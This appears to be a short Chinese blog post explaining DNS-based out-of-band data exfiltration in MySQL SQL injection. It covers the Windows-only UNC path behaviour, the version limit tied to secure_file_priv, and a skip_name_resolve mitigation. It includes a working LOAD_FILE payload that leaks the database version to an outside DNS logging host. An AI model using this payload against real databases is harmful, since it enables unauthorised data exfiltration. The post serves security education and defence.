---
title: MySQL利用DNS实现注入总结
date: 2019-04-05 16:11:37
tags: SQL注入 WEB安全
---

这个利用方式只能在Windows下利用，而且对mysql的版本也有限制：***mysql版本必须小于5.5.53***。

测试语句：

```
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.a.ceshia.ag5dgy.ceye.io\\abc'))

```

利用的DNS记录平台是 [ceye](http://ceye.io/records/dns)。

之所以只有windows下可以使用，是因为利用了windows的

```
\\127.0.0.1\1.txt
```
这种文件访问机制触发了dns解析问题，在linux下不存在此问题。

版本限制是因为在Mysql当中存在一个secure_file_priv全局变量，这个变量在5.5.53版本以前是null，就是关于load_file,outfile没有安全限制。之后的版本添加了安全限制。


```
这些函数是需要绝对路径的
如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用
但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了
```

另外，MySQL之所以能够解析域名，是因为

```
show variables like 'skip_name_resolve%';
```

skip_name_resolve 这个参数为OFF，修复方案就是将这个参数设置为ON，但是这样有可能影响正常业务，谨慎评估。



